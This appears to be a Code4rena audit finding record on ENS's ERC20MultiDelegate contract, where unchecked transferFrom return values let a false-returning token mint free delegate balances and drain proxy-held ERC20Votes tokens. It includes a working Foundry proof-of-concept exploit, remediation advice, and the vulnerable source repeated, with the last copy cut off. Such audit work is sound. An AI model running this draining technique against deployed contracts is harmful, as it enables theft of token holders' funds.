{
  "Title": "[M-01] Some tokens enable the direct draining of all approved `ERC20Votes` tokens",
  "Content": "\n### Lines of code\n\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L148><br>\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L160><br>\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L170><br>\n<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L101-L115>\n\n### Vulnerability details\n\nThere's an appropriately invalidated finding found by the bots during the bot race about the [unsafe use of `transferFrom` on non-standard ERC20 tokens](https://github.com/code-423n4/2023-10-ens/blob/main/bot-report.md#d24-unsafe-use-of-erc20-transfertransferfrom). The finding is mostly invalid because, here, we're using `ERC20Votes` tokens, not `ERC20` ones; hence the mentioned tokens like USDT aren't good arguments.\n\nI would like to argue, however, that the recommendation that would've been true here would be to wrap the `transferFrom` calls in a `require` statement, as the `transferFrom` functions used in `ERC20Votes` are still from the inherited `ERC20` interface and therefore could be returning a boolean (`transferFrom(address from, address to, uint256 amount) returns bool`, see [OpenZeppelin's implementation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20-transferFrom-address-address-uint256-)), instead of reverting, depending on the existence of such an `ERC20Votes` token. The assumption of an `ERC20Votes` token returning `true` or `false` instead of reverting will be used in this argumentation and be considered a possibility; especially since the list of potential `ERC20Votes token`s used by this contract isn't specified (`ENSToken` isn't enforced). Also, see [these posts](https://discord.com/channels/810916927919620096/1159158237325697166/1160653235703521451) from the Discord channel:\n\n> Question by J4X — Hey @nickjohnson, are we correct to assume that this will only be deployed on ethereum?\n> \n> Answer by nickjohnson — By us, yes, but consider the goal of the audit to be against any wrapped erc20votes token, not just `$`ens.\n\n**About this finding:**\n\nThis finding is the second one in a series of 2 findings using a similar set of arguments, but the first is used here as a chain:\n\n1. Some tokens break accounting by enabling the free minting of `ERC20MultiDelegate` tokens.\n2. Some tokens enable the direct draining of all approved `ERC20Votes` tokens.\n\nSome parts are similar between the two findings, but because they each deserved their own analysis and \"should fix\" - argumentation, they are submitted as separate findings.\n\n### Impact\n\nDraining all `ERC20Votes` tokens.\n\n### Proof of Concept\n\n**Starting assumptions:**\n\nThe `token` used as `ERC20Votes` returns the boolean `false` with `transferFrom` instead of reverting (not very likely implementation but still a possible and damaging edge case).\n\n**MockERC20Votes contract:**\n\nThe following `test/mocks/MockERC20Votes.sol` file is a simplified `ERC20Votes` token that wraps the original `transferFrom()` function to return a `bool` instead of reverting:\n\n```solidity\npragma solidity ^0.8.2;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol\";\nimport \"forge-std/console.sol\";\n\ncontract MockERC20Votes is ERC20, ERC20Votes {\n    constructor()\n        ERC20(\"MockERC20Votes\", \"MOCK\")\n        ERC20Permit(\"MockERC20Votes\")\n    {\n        _mint(msg.sender, 1e30);\n    }\n\n    function superTransferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool) {\n        return super.transferFrom(sender, recipient, amount);\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        (bool success, bytes memory data) = address(this).delegatecall(\n            abi.encodeCall(\n                MockERC20Votes.superTransferFrom,\n                (sender, recipient, amount)\n            )\n        );\n\n        console.log(\"success: \", success);\n\n        return success;\n    }\n\n    // The following functions are overrides required by Solidity.\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override(ERC20, ERC20Votes) {\n        super._afterTokenTransfer(from, to, amount);\n    }\n\n    function _mint(\n        address to,\n        uint256 amount\n    ) internal override(ERC20, ERC20Votes) {\n        super._mint(to, amount);\n    }\n\n    function _burn(\n        address account,\n        uint256 amount\n    ) internal override(ERC20, ERC20Votes) {\n        super._burn(account, amount);\n    }\n}\n```\n\nThe tests `test_transferFromReturningTrue` and `test_transferFromReturningFalse` are provided to showcase an example implementation of an `ERC20Votes` token that, instead of reverting, would return a boolean `success == false`. The reason for such a token's existence won't be discussed, as the sheer possibility of its existence is the only argument that is of interest to us (and demands from customers are sometimes surprising). As yet again another reminder: the \"standard\" is still respected in this argumentation.\n\n**Foundry Setup:**\n\nAdd `require(\"@nomicfoundation/hardhat-foundry\")` in `hardhat.config.js` and run this to be able to run the POC:\n\n```\nnpm install --save-dev @nomicfoundation/hardhat-foundry\nnpx hardhat init-foundry\n```\n\n**Test contract:**\n\n1. Create a `test/delegatemulti.t.sol` file containing the code below and focus on `test_directDraining()`:\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.2;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\nimport \"test/mocks/MockERC20Votes.sol\";\nimport \"contracts/ERC20MultiDelegate.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol\";\n\ncontract DelegateCallTest is IERC1155Receiver, Test {\n    address alice = makeAddr(\"Alice\");\n    address bob = makeAddr(\"Bob\");\n    MockERC20Votes votesToken;\n    ERC20MultiDelegate delegateToken;\n    address proxyAddress1;\n    address proxyAddress2;\n    address proxyAddress3;\n\n    function setUp() public {\n        // Deploying the tokens\n        votesToken = new MockERC20Votes();\n        delegateToken = new ERC20MultiDelegate(\n            votesToken,\n            \"https://code4rena.com/\"\n        );\n\n        // Giving some votesToken to Alice and Bob\n        votesToken.transfer(alice, 5);\n        votesToken.transfer(bob, 4);\n\n        // Initializing the ERC20MultiDelegate token with the first delegateMulti call\n        uint256[] memory initialSources; // No sources initially, just creating proxies and transferring votesToken\n        uint256[] memory initialTargets = new uint256[](3);\n        initialTargets[0] = 1;\n        initialTargets[1] = 2;\n        initialTargets[2] = 3;\n        uint256[] memory initialAmounts = new uint256[](3);\n        initialAmounts[0] = 0;\n        initialAmounts[1] = 10;\n        initialAmounts[2] = 20;\n        votesToken.approve(address(delegateToken), type(uint256).max);\n        delegateToken.delegateMulti(\n            initialSources,\n            initialTargets,\n            initialAmounts\n        );\n        proxyAddress1 = retrieveProxyContractAddress(address(uint160(1)));\n        proxyAddress2 = retrieveProxyContractAddress(address(uint160(2)));\n        proxyAddress3 = retrieveProxyContractAddress(address(uint160(3)));\n\n        // Making sure that the deployer's balance of ERC20MultiDelegate tokens matches the deployed proxies' balance.\n        assertEq(\n            votesToken.balanceOf(proxyAddress1),\n            delegateToken.balanceOf(address(this), 1)\n        );\n        assertEq(\n            votesToken.balanceOf(proxyAddress2),\n            delegateToken.balanceOf(address(this), 2)\n        );\n        assertEq(\n            votesToken.balanceOf(proxyAddress3),\n            delegateToken.balanceOf(address(this), 3)\n        );\n\n        // Alice approving ERC20MultiDelegate for her ERC20Votes tokens\n        vm.prank(alice);\n        votesToken.approve(address(delegateToken), type(uint256).max);\n    }\n\n    // Bug 1: Some tokens break accounting by enabling the free minting of `ERC20MultiDelegate` tokens\n    function test_freeMinting() public {\n        /* Showing the initial conditions through asserts */\n        // proxyAddress1 has 0 votesToken\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        // Alice has 5 voteTokens\n        assertEq(votesToken.balanceOf(alice), 5);\n        // Alice has 0 ERC20MultiDelegate tokens for ID(1)\n        assertEq(delegateToken.balanceOf(alice, 1), 0);\n\n        /* Begin minting for free */\n        vm.startPrank(alice);\n        uint256[] memory sources;\n        // Alice is targeting existing and non-existing proxies\n        uint256[] memory targets = new uint256[](7);\n        targets[0] = 1;\n        targets[1] = 2;\n        targets[2] = 3;\n        targets[3] = 4;\n        targets[4] = 5;\n        targets[5] = 6;\n        targets[6] = 7;\n        // Alice is using an arbitrary amount, exceeding the proxies' balances\n        uint256[] memory amounts = new uint256[](7);\n        amounts[0] = 100;\n        amounts[1] = 100;\n        amounts[2] = 100;\n        amounts[3] = 100;\n        amounts[4] = 100;\n        amounts[5] = 100;\n        amounts[6] = 100;\n        // Making the call, not reverting\n        delegateToken.delegateMulti(sources, targets, amounts);\n        vm.stopPrank();\n\n        /* Showing the final balances */\n        // There still aren't any ERC20Votes balance for proxyAddress1\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        // Alice's ERC20Votes balance stayed the same\n        assertEq(votesToken.balanceOf(alice), 5);\n        // However, ERC20MultiDelegate balances for IDs between 1 and 7 increased for Alice, effectively breaking accounting\n        assertEq(delegateToken.balanceOf(alice, 1), 100);\n        assertEq(delegateToken.balanceOf(alice, 2), 100);\n        assertEq(delegateToken.balanceOf(alice, 3), 100);\n        assertEq(delegateToken.balanceOf(alice, 4), 100);\n        assertEq(delegateToken.balanceOf(alice, 5), 100);\n        assertEq(delegateToken.balanceOf(alice, 6), 100);\n        assertEq(delegateToken.balanceOf(alice, 7), 100);\n    }\n\n    // Bug 2: Some tokens enable the direct draining of all approved `ERC20Votes` tokens\n    function test_directDraining() public {\n        /* Showing the initial conditions through asserts */\n        // Proxies' votesToken balance\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        assertEq(votesToken.balanceOf(proxyAddress2), 10);\n        assertEq(votesToken.balanceOf(proxyAddress3), 20);\n        // Alice's votesToken balance (from setUp())\n        assertEq(votesToken.balanceOf(alice), 5);\n        // Alice's delegateToken balance for each ID is initially 0\n        assertEq(delegateToken.balanceOf(alice, 1), 0);\n        assertEq(delegateToken.balanceOf(alice, 2), 0);\n        assertEq(delegateToken.balanceOf(alice, 3), 0);\n\n        /* Begin minting for free */\n        vm.startPrank(alice);\n        uint256[] memory sourcesStep1;\n        uint256[] memory targetsStep1 = new uint256[](3);\n        targetsStep1[0] = 1;\n        targetsStep1[1] = 2;\n        targetsStep1[2] = 3;\n        uint256[] memory amountsStep1 = new uint256[](3);\n        amountsStep1[0] = 100;\n        amountsStep1[1] = 100;\n        amountsStep1[2] = 100;\n        delegateToken.delegateMulti(sourcesStep1, targetsStep1, amountsStep1);\n        assertEq(delegateToken.balanceOf(alice, 1), 100);\n        assertEq(delegateToken.balanceOf(alice, 2), 100);\n        assertEq(delegateToken.balanceOf(alice, 3), 100);\n\n        /* Using newly-minted amounts to drain proxies */\n        uint256[] memory targetsStep2;\n        uint256[] memory sourcesStep2 = new uint256[](3);\n        sourcesStep2[0] = 1;\n        sourcesStep2[1] = 2;\n        sourcesStep2[2] = 3;\n        uint256[] memory amountsStep2 = new uint256[](3);\n        amountsStep2[0] = 0;\n        amountsStep2[1] = 10;\n        amountsStep2[2] = 20;\n        delegateToken.delegateMulti(sourcesStep2, targetsStep2, amountsStep2);\n\n        /* Showing the final balances */\n\n        // Proxies are drained\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        assertEq(votesToken.balanceOf(proxyAddress2), 0);\n        assertEq(votesToken.balanceOf(proxyAddress3), 0);\n\n        // Alice's votesToken balance is now \"InitialBalance + balances from proxies\"\n        assertEq(votesToken.balanceOf(alice), 5 + 10 + 20);\n\n        // Alice really did use her fake ERC20MultiDelegate balance\n        assertEq(delegateToken.balanceOf(alice, 1), 100);\n        assertEq(delegateToken.balanceOf(alice, 2), 90);\n        assertEq(delegateToken.balanceOf(alice, 3), 80);\n\n        vm.stopPrank();\n    }\n\n    /** BELOW ARE JUST UTILITIES */\n\n    // Making sure that the MockERC20Votes returns false instead of reverting on failure for transferFrom\n    function test_transferFromReturningFalse() public {\n        // If you don't approve yourself, transferFrom won't be directly callable\n        vm.prank(bob);\n        bool success = votesToken.transferFrom(alice, bob, 5);\n        assertEq(success, false);\n    }\n\n    // Making sure that the MockERC20Votes returns true on success for transferFrom\n    function test_transferFromReturningTrue() public {\n        // There's a need to approve yourself for a direct call to transferFrom(), surprisingly\n        vm.startPrank(alice);\n        votesToken.approve(alice, type(uint256).max);\n        bool success = votesToken.transferFrom(alice, bob, 5);\n        vm.stopPrank();\n        assertEq(success, true);\n    }\n\n    // copy-pasting and adapting ERC20MultiDelegate.retrieveProxyContractAddress\n    function retrieveProxyContractAddress(\n        address _delegate\n    ) private view returns (address) {\n        bytes memory bytecode = abi.encodePacked(\n            type(ERC20ProxyDelegator).creationCode,\n            abi.encode(votesToken, _delegate)\n        );\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff),\n                address(delegateToken),\n                uint256(0), // salt\n                keccak256(bytecode)\n            )\n        );\n        return address(uint160(uint256(hash)));\n    }\n\n    // No need to read below (IERC1155Receiver implementation)\n    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4) {\n        return IERC1155Receiver.onERC1155Received.selector;\n    }\n\n    function onERC1155BatchReceived(\n        address operator,\n        address from,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external returns (bytes4) {\n        return IERC1155Receiver.onERC1155BatchReceived.selector;\n    }\n\n    // ERC165 interface support\n    function supportsInterface(\n        bytes4 interfaceID\n    ) external view returns (bool) {\n        return\n            interfaceID == 0x01ffc9a7 || // ERC165\n            interfaceID == 0x4e2312e0; // ERC1155_ACCEPTED ^ ERC1155_BATCH_ACCEPTED;\n    }\n}\n```\n\n</details>\n\n\n2.  Run the test with `forge test --mt test_directDraining` and see this test passing.\n\n**Here's the layout of what's happening (the first 3 steps are like \"`Bug1: test_freeMinting`\"):**\n\n1. Initially, Alice owns some `ERC20Votes` tokens (`5`) but no `ERC20MultiDelegate` tokens.\n2. Alice calls `delegateMulti()` by targeting existing IDs on `ERC20MultiDelegate` and inputting `amount == 100` for each of them.\n3. The lack of revert (as a reminder, the `transferFrom()` function in this example returns a boolean) makes it that the silent failure enables Alice to mint any amount on any ID on `ERC20MultiDelegate`.\n4. Alice can now use their newly minted balance of `ERC20MultiDelegate` tokens by calling `delegateMulti()`, with this time the deployed proxy contracts as `source`s.\n5. All `ERC20Votes` tokens got drained from all deployed proxies and were transferred to Alice.\n\nHere, we're both breaking accounting (bug1) and taking advantage of approved funds to the main contract by the deployed proxies to drain all `ERC20Votes` tokens.\n\nAgain, this contract's security shouldn't depend on the behavior of an external `ERC20Votes` contract (it leaves vectors open). Hence, this is a \"should fix\" bug, meaning at least Medium severity. The token-draining part makes an argument for a higher severity.\n\n### Remediation\n\nWhile wrapping the `transferFrom()` statements in a `require` statement is a good idea that was suggested in the previous bug, it would also be advisable to try and enforce an invariant by checking for the `source`'s balance inside `_reimburse()`, just like it is done inside `_processDelegation()`. Albeit, it's for the `ERC20MultiDelegate`'s internal balance, and not `ERC20Votes`'s external balance check. The principle still holds and adding a check would increase security. Note that, while the existing `assert()` can be sidestepped, and this is detailed in another finding, it wouldn't be the case with `ERC20Votes`'s external balance due to the immediate transfer.\n\n### Assessed type\n\nToken-Transfer\n\n**[141345 (lookout) commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1759034335):**\n > return false of `transferFrom()`.\n> \n> From [eip-20](https://eips.ethereum.org/EIPS/eip-20):\n> > Callers MUST handle false from returns (bool success). Callers MUST NOT assume that false is never returned!\n> \n> Tokens should comply with `ERC20votes` standard, but reverting on failure is not ERC20 standard.\n\n**[Arachnid (ENS) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1763944543):**\n > Agreed this is a valid issue - to be ERC20 compliant we must check the return value. Given the low likelihood, most token implementations and all known implementations of ERC20Votes revert - I would argue this should be rated as Medium.\n\n\n**[hansfriese (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1775087374):**\n > Medium severity is appropriate with the low likelihood.\n\n*Note: for full discussion, see [here](https://github.com/code-423n4/2023-10-ens-findings/issues/91).*\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-10-ens",
  "Code": [
    {
      "filename": "contracts/ERC20MultiDelegate.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\nimport {Address} from \"@openzeppelin/contracts/utils/Address.sol\";\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol\";\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n/**\n * @dev A child contract which will be deployed by the ERC20MultiDelegate utility contract\n * This is a proxy delegator contract to vote given delegate on behalf of original delegator\n */\ncontract ERC20ProxyDelegator {\n    constructor(ERC20Votes _token, address _delegate) {\n        _token.approve(msg.sender, type(uint256).max);\n        _token.delegate(_delegate);\n    }\n}\n\n/**\n * @dev A utility contract to let delegators to pick multiple delegate\n */\ncontract ERC20MultiDelegate is ERC1155, Ownable {\n    using Address for address;\n\n    ERC20Votes public token;\n\n    /** ### EVENTS ### */\n\n    event ProxyDeployed(address indexed delegate, address proxyAddress);\n    event DelegationProcessed(\n        address indexed from,\n        address indexed to,\n        uint256 amount\n    );\n\n    /**\n     * @dev Constructor.\n     * @param _token The ERC20 token address\n     * @param _metadata_uri ERC1155 metadata uri\n     */\n    constructor(\n        ERC20Votes _token,\n        string memory _metadata_uri\n    ) ERC1155(_metadata_uri) {\n        token = _token;\n    }\n\n    /**\n     * @dev Executes the delegation transfer process for multiple source and target delegates.\n     * @param sources The list of source delegates.\n     * @param targets The list of target delegates.\n     * @param amounts The list of amounts to deposit/withdraw.\n     */\n    function delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) external {\n        _delegateMulti(sources, targets, amounts);\n    }\n\n    function _delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) internal {\n        uint256 sourcesLength = sources.length;\n        uint256 targetsLength = targets.length;\n        uint256 amountsLength = amounts.length;\n\n        require(\n            sourcesLength > 0 || targetsLength > 0,\n            \"Delegate: You should provide at least one source or one target delegate\"\n        );\n\n        require(\n            Math.max(sourcesLength, targetsLength) == amountsLength,\n            \"Delegate: The number of amounts must be equal to the greater of the number of sources or targets\"\n        );\n\n        // Iterate until all source and target delegates have been processed.\n        for (\n            uint transferIndex = 0;\n            transferIndex < Math.max(sourcesLength, targetsLength);\n            transferIndex++\n        ) {\n            address source = transferIndex < sourcesLength\n                ? address(uint160(sources[transferIndex]))\n                : address(0);\n            address target = transferIndex < targetsLength\n                ? address(uint160(targets[transferIndex]))\n                : address(0);\n            uint256 amount = amounts[transferIndex];\n\n            if (transferIndex < Math.min(sourcesLength, targetsLength)) {\n                // Process the delegation transfer between the current source and target delegate pair.\n                _processDelegation(source, target, amount);\n            } else if (transferIndex < sourcesLength) {\n                // Handle any remaining source amounts after the transfer process.\n                _reimburse(source, amount);\n            } else if (transferIndex < targetsLength) {\n                // Handle any remaining target amounts after the transfer process.\n                createProxyDelegatorAndTransfer(target, amount);\n            }\n        }\n\n        if (sourcesLength > 0) {\n            _burnBatch(msg.sender, sources, amounts[:sourcesLength]);\n        }\n        if (targetsLength > 0) {\n            _mintBatch(msg.sender, targets, amounts[:targetsLength], \"\");\n        }\n    }\n\n    /**\n     * @dev Processes the delegation transfer between a source delegate and a target delegate.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param target The target delegate to which tokens are being transferred.\n     * @param amount The amount of tokens transferred between the source and target delegates.\n     */\n    function _processDelegation(\n        address source,\n        address target,\n        uint256 amount\n    ) internal {\n        uint256 balance = getBalanceForDelegate(source);\n\n        assert(amount <= balance);\n\n        deployProxyDelegatorIfNeeded(target);\n        transferBetweenDelegators(source, target, amount);\n\n        emit DelegationProcessed(source, target, amount);\n    }\n\n    /**\n     * @dev Reimburses any remaining source amounts back to the delegator after the delegation transfer process.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param amount The amount of tokens to be withdrawn from the source delegate.\n     */\n    function _reimburse(address source, uint256 amount) internal {\n        // Transfer the remaining source amount or the full source amount\n        // (if no remaining amount) to the delegator\n        address proxyAddressFrom = retrieveProxyContractAddress(token, source);\n        token.transferFrom(proxyAddressFrom, msg.sender, amount);\n    }\n\n    function setUri(string memory uri) external onlyOwner {\n        _setURI(uri);\n    }\n\n    function createProxyDelegatorAndTransfer(\n        address target,\n        uint256 amount\n    ) internal {\n        address proxyAddress = deployProxyDelegatorIfNeeded(target);\n        token.transferFrom(msg.sender, proxyAddress, amount);\n    }\n\n    function transferBetweenDelegators(\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        address proxyAddressFrom = retrieveProxyContractAddress(token, from);\n        address proxyAddressTo = retrieveProxyContractAddress(token, to);\n        token.transferFrom(proxyAddressFrom, proxyAddressTo, amount);\n    }\n\n    function deployProxyDelegatorIfNeeded(\n        address delegate\n    ) internal returns (address) {\n        address proxyAddress = retrieveProxyContractAddress(token, delegate);\n\n        // check if the proxy contract has already been deployed\n        uint bytecodeSize;\n        assembly {\n            bytecodeSize := extcodesize(proxyAddress)\n        }\n\n        // if the proxy contract has not been deployed, deploy it\n        if (bytecodeSize == 0) {\n            new ERC20ProxyDelegator{salt: 0}(token, delegate);\n            emit ProxyDeployed(delegate, proxyAddress);\n        }\n        return proxyAddress;\n    }\n\n    function getBalanceForDelegate(\n        address delegate\n    ) internal view returns (uint256) {\n        return ERC1155(this).balanceOf(msg.sender, uint256(uint160(delegate)));\n    }\n\n    function retrieveProxyContractAddress(\n        ERC20Votes _token,\n        address _delegate\n    ) private view returns (address) {\n        bytes memory bytecode = abi.encodePacked(\n            type(ERC20ProxyDelegator).creationCode, \n            abi.encode(_token, _delegate)\n        );\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                uint256(0), // salt\n                keccak256(bytecode)\n            )\n        );\n        return address(uint160(uint256(hash)));\n    }\n}"
    },
    {
      "filename": "contracts/ERC20MultiDelegate.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\nimport {Address} from \"@openzeppelin/contracts/utils/Address.sol\";\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol\";\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n/**\n * @dev A child contract which will be deployed by the ERC20MultiDelegate utility contract\n * This is a proxy delegator contract to vote given delegate on behalf of original delegator\n */\ncontract ERC20ProxyDelegator {\n    constructor(ERC20Votes _token, address _delegate) {\n        _token.approve(msg.sender, type(uint256).max);\n        _token.delegate(_delegate);\n    }\n}\n\n/**\n * @dev A utility contract to let delegators to pick multiple delegate\n */\ncontract ERC20MultiDelegate is ERC1155, Ownable {\n    using Address for address;\n\n    ERC20Votes public token;\n\n    /** ### EVENTS ### */\n\n    event ProxyDeployed(address indexed delegate, address proxyAddress);\n    event DelegationProcessed(\n        address indexed from,\n        address indexed to,\n        uint256 amount\n    );\n\n    /**\n     * @dev Constructor.\n     * @param _token The ERC20 token address\n     * @param _metadata_uri ERC1155 metadata uri\n     */\n    constructor(\n        ERC20Votes _token,\n        string memory _metadata_uri\n    ) ERC1155(_metadata_uri) {\n        token = _token;\n    }\n\n    /**\n     * @dev Executes the delegation transfer process for multiple source and target delegates.\n     * @param sources The list of source delegates.\n     * @param targets The list of target delegates.\n     * @param amounts The list of amounts to deposit/withdraw.\n     */\n    function delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) external {\n        _delegateMulti(sources, targets, amounts);\n    }\n\n    function _delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) internal {\n        uint256 sourcesLength = sources.length;\n        uint256 targetsLength = targets.length;\n        uint256 amountsLength = amounts.length;\n\n        require(\n            sourcesLength > 0 || targetsLength > 0,\n            \"Delegate: You should provide at least one source or one target delegate\"\n        );\n\n        require(\n            Math.max(sourcesLength, targetsLength) == amountsLength,\n            \"Delegate: The number of amounts must be equal to the greater of the number of sources or targets\"\n        );\n\n        // Iterate until all source and target delegates have been processed.\n        for (\n            uint transferIndex = 0;\n            transferIndex < Math.max(sourcesLength, targetsLength);\n            transferIndex++\n        ) {\n            address source = transferIndex < sourcesLength\n                ? address(uint160(sources[transferIndex]))\n                : address(0);\n            address target = transferIndex < targetsLength\n                ? address(uint160(targets[transferIndex]))\n                : address(0);\n            uint256 amount = amounts[transferIndex];\n\n            if (transferIndex < Math.min(sourcesLength, targetsLength)) {\n                // Process the delegation transfer between the current source and target delegate pair.\n                _processDelegation(source, target, amount);\n            } else if (transferIndex < sourcesLength) {\n                // Handle any remaining source amounts after the transfer process.\n                _reimburse(source, amount);\n            } else if (transferIndex < targetsLength) {\n                // Handle any remaining target amounts after the transfer process.\n                createProxyDelegatorAndTransfer(target, amount);\n            }\n        }\n\n        if (sourcesLength > 0) {\n            _burnBatch(msg.sender, sources, amounts[:sourcesLength]);\n        }\n        if (targetsLength > 0) {\n            _mintBatch(msg.sender, targets, amounts[:targetsLength], \"\");\n        }\n    }\n\n    /**\n     * @dev Processes the delegation transfer between a source delegate and a target delegate.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param target The target delegate to which tokens are being transferred.\n     * @param amount The amount of tokens transferred between the source and target delegates.\n     */\n    function _processDelegation(\n        address source,\n        address target,\n        uint256 amount\n    ) internal {\n        uint256 balance = getBalanceForDelegate(source);\n\n        assert(amount <= balance);\n\n        deployProxyDelegatorIfNeeded(target);\n        transferBetweenDelegators(source, target, amount);\n\n        emit DelegationProcessed(source, target, amount);\n    }\n\n    /**\n     * @dev Reimburses any remaining source amounts back to the delegator after the delegation transfer process.\n     * @param source The source delegate from which tokens are being withdrawn.\n     * @param amount The amount of tokens to be withdrawn from the source delegate.\n     */\n    function _reimburse(address source, uint256 amount) internal {\n        // Transfer the remaining source amount or the full source amount\n        // (if no remaining amount) to the delegator\n        address proxyAddressFrom = retrieveProxyContractAddress(token, source);\n        token.transferFrom(proxyAddressFrom, msg.sender, amount);\n    }\n\n    function setUri(string memory uri) external onlyOwner {\n        _setURI(uri);\n    }\n\n    function createProxyDelegatorAndTransfer(\n        address target,\n        uint256 amount\n    ) internal {\n        address proxyAddress = deployProxyDelegatorIfNeeded(target);\n        token.transferFrom(msg.sender, proxyAddress, amount);\n    }\n\n    function transferBetweenDelegators(\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        address proxyAddressFrom = retrieveProxyContractAddress(token, from);\n        address proxyAddressTo = retrieveProxyContractAddress(token, to);\n        token.transferFrom(proxyAddressFrom, proxyAddressTo, amount);\n    }\n\n    function deployProxyDelegatorIfNeeded(\n        address delegate\n    ) internal returns (address) {\n        address proxyAddress = retrieveProxyContractAddress(token, delegate);\n\n        // check if the proxy contract has already been deployed\n        uint bytecodeSize;\n        assembly {\n            bytecodeSize := extcodesize(proxyAddress)\n        }\n\n        // if the proxy contract has not been deployed, deploy it\n        if (bytecodeSize == 0) {\n            new ERC20ProxyDelegator{salt: 0}(token, delegate);\n            emit ProxyDeployed(delegate, proxyAddress);\n        }\n        return proxyAddress;\n    }\n\n    function getBalanceForDelegate(\n        address delegate\n    ) internal view returns (uint256) {\n        return ERC1155(this).balanceOf(msg.sender, uint256(uint160(delegate)));\n    }\n\n    function retrieveProxyContractAddress(\n        ERC20Votes _token,\n        address _delegate\n    ) private view returns (address) {\n        bytes memory bytecode = abi.encodePacked(\n            type(ERC20ProxyDelegator).creationCode, \n            abi.encode(_token, _delegate)\n        );\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                uint256(0), // salt\n                keccak256(bytecode)\n            )\n        );\n        return address(uint160(uint256(hash)));\n    }\n}"
    },
    {
      "filename": "contracts/ERC20MultiDelegate.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.2;\n\nimport {Address} from \"@openzeppelin/contracts/utils/Address.sol\";\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol\";\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n/**\n * @dev A child contract which will be deployed by the ERC20MultiDelegate utility contract\n * This is a proxy delegator contract to vote given delegate on behalf of original delegator\n */\ncontract ERC20ProxyDelegator {\n    constructor(ERC20Votes _token, address _delegate) {\n        _token.approve(msg.sender, type(uint256).max);\n        _token.delegate(_delegate);\n    }\n}\n\n/**\n * @dev A utility contract to let delegators to pick multiple delegate\n */\ncontract ERC20MultiDelegate is ERC1155, Ownable {\n    using Address for address;\n\n    ERC20Votes public token;\n\n    /** ### EVENTS ### */\n\n    event ProxyDeployed(address indexed delegate, address proxyAddress);\n    event DelegationProcessed(\n        address indexed from,\n        address indexed to,\n        uint256 amount\n    );\n\n    /**\n     * @dev Constructor.\n     * @param _token The ERC20 token address\n     * @param _metadata_uri ERC1155 metadata uri\n     */\n    constructor(\n        ERC20Votes _token,\n        string memory _metadata_uri\n    ) ERC1155(_metadata_uri) {\n        token = _token;\n    }\n\n    /**\n     * @dev Executes the delegation transfer process for multiple source and target delegates.\n     * @param sources The list of source delegates.\n     * @param targets The list of target delegates.\n     * @param amounts The list of amounts to deposit/withdraw.\n     */\n    function delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) external {\n        _delegateMulti(sources, targets, amounts);\n    }\n\n    function _delegateMulti(\n        uint256[] calldata sources,\n        uint256[] calldata targets,\n        uint256[] calldata amounts\n    ) internal {\n        uint256 sourcesLength = sources.length;\n        uint256 targetsLength = targets.length;\n        uint256 amountsLength = amounts.length;\n\n        require(\n            